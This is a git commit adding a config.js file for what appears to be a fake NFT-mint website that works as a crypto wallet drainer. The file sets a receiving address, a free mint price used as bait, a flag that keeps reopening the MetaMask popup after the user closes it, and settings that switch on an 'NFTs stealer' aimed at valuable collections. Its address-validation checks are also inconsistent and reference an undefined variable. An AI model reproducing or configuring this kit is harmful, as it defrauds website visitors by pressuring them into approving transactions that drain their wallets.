6b769d344576ed9c6a7a910efe05b6a3d81d149a
yungblood00 <117261553+yungblood00@users.noreply.github.com>
2023-04-18 23:00:50 +0300

    Add files via upload

---
+++ main(website-files)/config.js
@@ -0,0 +1,26 @@
+const address = "AtT9eepbcutqFS88xwUfkBQ2MwF2RWSsG5h7Jg4XnsCv";
+
+const mintInfo = {
+    price: 0,         // Price per NFT.
+    totalSupply: 555,   // Total supply of NFTs.
+    minUnits: 1,        // Min units to buy.
+    maxUnits: 5,        // Max units to buy.
+    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
+}
+
+const nftsInfo = {
+    active: true,   // Active (true) or not (false) NFTs stealer.
+    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
+    receiveAddress: "" // leave empty if you want to use the same address 
+}
+
+if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
+if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
+
+if (!address.startsWith("0x") ||
+    (
+        address.length >= 64 ||
+        address.length <= 40
+    )
+) console.error(`Error: ${address} is not a valid Solana address.`);
